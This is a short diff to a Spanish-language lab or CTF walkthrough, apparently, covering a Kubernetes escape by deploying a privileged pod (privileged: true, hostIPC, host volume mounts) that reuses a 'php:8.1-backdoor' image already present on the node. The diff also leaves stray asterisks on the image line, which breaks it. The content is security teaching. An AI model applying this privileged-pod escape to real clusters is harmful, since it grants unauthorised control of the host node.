@@ -380,6 +380,8 @@ Explicacion : El proceso que haremos a continuacion sera crear un pod que montar
 
 Fichero de configuracion de nuestro pod, esevka.yaml
 
+Importante: La imagen del contenedor debe ser la misma que la del otro pod ya que sabemos que esta desplegada y funcionando en el nodo, de lo contrario no funcionara.
+
     apiVersion: v1
     kind: Pod
     metadata:
@@ -392,7 +394,7 @@ Fichero de configuracion de nuestro pod, esevka.yaml
       hostIPC: true
       containers:
       - name: esevka
-        image: vulhub/php:8.1-backdoor
+        image: vulhub/php:8.1-backdoor **************
         securityContext:
           privileged: true
         volumeMounts:
